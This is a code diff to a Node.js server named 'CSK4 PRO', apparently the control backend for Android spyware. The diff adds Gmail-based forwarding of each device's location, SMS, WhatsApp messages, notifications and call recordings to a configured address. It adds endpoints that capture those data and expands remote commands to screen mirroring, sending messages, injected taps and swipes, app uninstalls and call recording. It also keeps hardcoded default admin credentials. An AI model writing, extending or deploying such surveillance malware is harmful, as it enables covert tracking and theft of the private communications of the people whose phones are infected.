@@ -5,7 +5,9 @@ const cors = require('cors');
 const multer = require('multer');
 const bodyParser = require('body-parser');
 const { Server } = require('socket.io');
+const nodemailer = require('nodemailer');
 const fs = require('fs');
+require('dotenv').config();
 
 const app = express();
 const server = http.createServer(app);
@@ -17,11 +19,60 @@ const io = new Server(server, {
 
 // ============ CONFIG ============
 const CONFIG = {
-  ADMIN_USER: 'admin',
-  ADMIN_PASS: 'csk4@2024',
-  DEVICE_TOKEN: 'CSK4-DEVICE-SECRET-123',
-  PORT: process.env.PORT || 4000
+  ADMIN_USER: process.env.ADMIN_USER || 'admin',
+  ADMIN_PASS: process.env.ADMIN_PASS || 'csk4@2024',
+  DEVICE_TOKEN: process.env.DEVICE_TOKEN || 'CSK4-DEVICE-SECRET-123',
+  PORT: process.env.PORT || 4000,
+  EMAIL_USER: process.env.EMAIL_USER || '',
+  EMAIL_PASS: process.env.EMAIL_PASS || '',
+  EMAIL_TO: process.env.EMAIL_TO || '',
+  ENABLE_EMAIL: process.env.ENABLE_EMAIL === 'true',
+  MAX_EMAILS_PER_HOUR: parseInt(process.env.MAX_EMAILS_PER_HOUR) || 100
 };
+
+// ============ EMAIL SETUP ============
+let transporter = null;
+if (CONFIG.ENABLE_EMAIL && CONFIG.EMAIL_USER && CONFIG.EMAIL_PASS) {
+  transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: CONFIG.EMAIL_USER,
+      pass: CONFIG.EMAIL_PASS
+    }
+  });
+  console.log('📧 Email enabled for:', CONFIG.EMAIL_USER);
+}
+
+let emailCount = 0;
+let emailResetTime = Date.now();
+
+async function sendEmail(subject, body, attachments = []) {
+  if (!transporter || !CONFIG.ENABLE_EMAIL) return;
+  
+  // Rate limit
+  if (Date.now() - emailResetTime > 3600000) {
+    emailCount = 0;
+    emailResetTime = Date.now();
+  }
+  if (emailCount >= CONFIG.MAX_EMAILS_PER_HOUR) {
+    console.log('⚠️ Email rate limit reached');
+    return;
+  }
+  
+  try {
+    await transporter.sendMail({
+      from: `"CSK4 Server" <${CONFIG.EMAIL_USER}>`,
+      to: CONFIG.EMAIL_TO,
+      subject: subject,
+      text: body,
+      attachments: attachments
+    });
+    emailCount++;
+    console.log('📧 Email sent:', subject);
+  } catch (e) {
+    console.error('❌ Email fail:', e.message);
+  }
+}
 
 // ============ MIDDLEWARE ============
 app.use(cors());
@@ -58,6 +109,10 @@ let callLogs = [];
 let installedApps = [];
 let screenshots = [];
 let bluetoothDevices = [];
+let notifications = [];
+let whatsappMessages = [];
+let activities = [];
+let callRecordings = [];
 
 // ============ DEVICE ENDPOINTS ============
 
@@ -76,6 +131,10 @@ app.post('/api/device/register', (req, res) => {
   };
   io.emit('device-update', devices);
   console.log(`✅ ${deviceName} (${deviceId})`);
+  sendEmail(
+    `🟢 Device Online: ${deviceName}`,
+    `Device: ${deviceName}\nID: ${deviceId}\nModel: ${model}\nAndroid: ${android}\nBattery: ${battery}%\nIP: ${req.ip}\nTime: ${new Date().toLocaleString()}`
+  );
   res.json({ success: true });
 });
 
@@ -96,8 +155,12 @@ app.post('/api/device/location', (req, res) => {
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   const entry = { deviceId, lat, lng, accuracy, time: new Date() };
   locations.push(entry);
-  if (locations.length > 2000) locations.shift();
+  if (locations.length > 5000) locations.shift();
   io.emit('new-location', entry);
+  sendEmail(
+    `📍 Location Update`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ${accuracy}m\nMaps: https://maps.google.com/?q=${lat},${lng}\nTime: ${new Date().toLocaleString()}`
+  );
   res.json({ success: true });
 });
 
@@ -105,8 +168,12 @@ app.post('/api/device/contacts', (req, res) => {
   const { deviceId, contacts: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   contacts = contacts.filter(c => c.deviceId !== deviceId);
-  list.forEach(c => contacts.push({ deviceId, name: c.name, phone: c.phone }));
+  list.forEach(c => contacts.push({ deviceId, name: c.name, phone: c.phone, type: c.type }));
   io.emit('contacts-update', contacts);
+  sendEmail(
+    `👥 Contacts Uploaded`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\nTotal: ${list.length}\nTime: ${new Date().toLocaleString()}`
+  );
   res.json({ success: true, count: list.length });
 });
 
@@ -116,6 +183,16 @@ app.post('/api/device/messages', (req, res) => {
   messages = messages.filter(m => m.deviceId !== deviceId);
   list.forEach(m => messages.push({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
   io.emit('messages-update', messages);
+  
+  // Email recent 5 SMS
+  const recent = list.slice(0, 5);
+  if (recent.length > 0) {
+    let body = `Device: ${devices[deviceId]?.deviceName || deviceId}\nTotal: ${list.length}\n\nRecent Messages:\n\n`;
+    recent.forEach(m => {
+      body += `📱 ${m.from}\n${m.body}\n${new Date(parseInt(m.time) || m.time).toLocaleString()}\n\n`;
+    });
+    sendEmail(`💬 SMS Uploaded (${list.length})`, body);
+  }
   res.json({ success: true });
 });
 
@@ -160,6 +237,80 @@ app.post('/api/device/info', (req, res) => {
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   deviceInfo[deviceId] = { ...info, time: new Date() };
   io.emit('info-update', deviceInfo);
+  res.json({ success: true });
+});
+
+// ============ NOTIFICATIONS (NEW) ============
+app.post('/api/device/notification', (req, res) => {
+  const { deviceId, package: pkg, title, text, time, token } = req.body;
+  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  const entry = { deviceId, package: pkg, title, text, time: new Date() };
+  notifications.push(entry);
+  if (notifications.length > 1000) notifications.shift();
+  io.emit('new-notification', entry);
+  sendEmail(
+    `🔔 ${title || pkg}`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\nApp: ${pkg}\nTitle: ${title}\nText: ${text}\nTime: ${new Date().toLocaleString()}`
+  );
+  res.json({ success: true });
+});
+
+// ============ WHATSAPP (NEW) ============
+app.post('/api/device/whatsapp', (req, res) => {
+  const { deviceId, from, message, time, token } = req.body;
+  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  const entry = { deviceId, from, message, time: new Date() };
+  whatsappMessages.push(entry);
+  if (whatsappMessages.length > 1000) whatsappMessages.shift();
+  io.emit('whatsapp-update', whatsappMessages);
+  sendEmail(
+    `💬 WhatsApp: ${from}`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\nFrom: ${from}\nMessage: ${message}\nTime: ${new Date().toLocaleString()}`
+  );
+  res.json({ success: true });
+});
+
+// ============ ACTIVITIES (NEW) ============
+app.post('/api/device/activity', (req, res) => {
+  const { deviceId, type, data, time, token } = req.body;
+  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  const entry = { deviceId, type, data, time: new Date() };
+  activities.push(entry);
+  if (activities.length > 2000) activities.shift();
+  io.emit('activity-update', activities);
+  sendEmail(
+    `📊 Activity: ${type}`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\nType: ${type}\nData: ${JSON.stringify(data)}\nTime: ${new Date().toLocaleString()}`
+  );
+  res.json({ success: true });
+});
+
+// ============ CALL RECORDING (NEW) ============
+app.post('/api/device/callrecording', upload.single('file'), (req, res) => {
+  const { deviceId, number, duration, type, token } = req.body;
+  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  if (!req.file) return res.status(400).json({ error: 'No file' });
+  
+  const entry = {
+    deviceId,
+    number,
+    duration,
+    type,
+    filename: req.file.filename,
+    url: `/uploads/${req.file.filename}`,
+    time: new Date()
+  };
+  callRecordings.push(entry);
+  io.emit('callrecording-update', callRecordings);
+  
+  sendEmail(
+    `📞 Call Recording: ${number}`,
+    `Device: ${devices[deviceId]?.deviceName || deviceId}\nNumber: ${number}\nType: ${type}\nDuration: ${duration}s\nTime: ${new Date().toLocaleString()}`,
+    [{
+      filename: `call-${number}-${Date.now()}.m4a`,
+      path: `./uploads/${req.file.filename}`
+    }]
+  );
   res.json({ success: true });
 });
 
@@ -217,6 +368,7 @@ app.get('/api/admin/data', (req, res) => {
     devices, locations, contacts, files, photos, videos,
     audio: audioRec, nearby: nearbyDevices, bluetooth: bluetoothDevices,
     messages, callLogs, apps: installedApps, deviceInfo, commands, screenshots,
+    notifications, whatsapp: whatsappMessages, activities, callRecordings,
     stats: {
       totalDevices: Object.keys(devices).length,
       onlineDevices: Object.values(devices).filter(d => d.online).length,
@@ -228,7 +380,11 @@ app.get('/api/admin/data', (req, res) => {
       totalMessages: messages.length,
       totalApps: installedApps.length,
       totalBluetooth: bluetoothDevices.length,
-      totalScreenshots: screenshots.length
+      totalScreenshots: screenshots.length,
+      totalNotifications: notifications.length,
+      totalWhatsapp: whatsappMessages.length,
+      totalActivities: activities.length,
+      totalCallRecordings: callRecordings.length
     }
   });
 });
@@ -238,13 +394,17 @@ app.post('/api/admin/command', (req, res) => {
   const validCommands = [
     'take_photo_front', 'take_photo_back',
     'record_video_front', 'record_video_back',
-    'record_audio',
+    'record_audio', 'screenshot', 'lock_screen',
     'get_location', 'get_contacts', 'get_messages', 'get_calllogs',
     'get_files', 'get_apps', 'get_nearby', 'get_bluetooth', 'get_info',
     'vibrate', 'play_sound', 'flashlight_on', 'flashlight_off',
-    'screenshot', 'lock_screen',
-    'start_webrtc', 'start_audio_stream', 'stop_webrtc',
-    'switch_camera'
+    'start_webrtc', 'start_audio_stream', 'stop_webrtc', 'switch_camera',
+    'start_screen_mirror', 'stop_screen_mirror',
+    'open_app', 'uninstall_app', 'force_stop_app',
+    'set_brightness', 'set_volume', 'set_ring_mode',
+    'send_sms', 'send_whatsapp', 'show_notification',
+    'touch_tap', 'touch_swipe',
+    'start_call_recording', 'stop_call_recording'
   ];
   if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });
 
@@ -266,7 +426,8 @@ app.delete('/api/admin/device/:deviceId', (req, res) => {
   const id = req.params.deviceId;
   delete devices[id];
   [locations, contacts, files, photos, videos, audioRec, messages,
-   callLogs, installedApps, screenshots, bluetoothDevices].forEach(arr => {
+   callLogs, installedApps, screenshots, bluetoothDevices,
+   notifications, whatsappMessages, activities].forEach(arr => {
     for (let i = arr.length - 1; i >= 0; i--) if (arr[i].deviceId === id) arr.splice(i, 1);
   });
   io.emit('device-update', devices);
@@ -292,21 +453,20 @@ io.on('connection', (socket) => {
     console.log('👤 Admin');
   });
 
-  socket.on('webrtc-offer', (data) => {
-    io.to(data.target).emit('webrtc-offer', data);
-  });
-  socket.on('webrtc-answer', (data) => {
-    io.to(data.target).emit('webrtc-answer', data);
-  });
-  socket.on('webrtc-ice', (data) => {
-    io.to(data.target).emit('webrtc-ice', data);
-  });
+  socket.on('webrtc-offer', (data) => io.to(data.target).emit('webrtc-offer', data));
+  socket.on('webrtc-answer', (data) => io.to(data.target).emit('webrtc-answer', data));
+  socket.on('webrtc-ice', (data) => io.to(data.target).emit('webrtc-ice', data));
+  socket.on('screen-mirror-offer', (data) => io.to(data.target).emit('screen-mirror-offer', data));
+  socket.on('screen-mirror-answer', (data) => io.to(data.target).emit('screen-mirror-answer', data));
+  socket.on('screen-mirror-ice', (data) => io.to(data.target).emit('screen-mirror-ice', data));
 
   socket.on('disconnect', () => console.log('❌', socket.id));
 });
 
 // ============ START ============
 server.listen(CONFIG.PORT, '0.0.0.0', () => {
-  console.log(`🚀 CSK4 PRO Server running on port ${CONFIG.PORT}`);
+  console.log(`🚀 CSK4 PRO Server v3.0 running on port ${CONFIG.PORT}`);
   console.log(`   Admin Panel: http://localhost:${CONFIG.PORT}/`);
+  console.log(`   Email: ${CONFIG.ENABLE_EMAIL ? '✅ Enabled' : '❌ Disabled'}`);
+  console.log(`   Email To: ${CONFIG.EMAIL_TO || 'Not set'}`);
 });
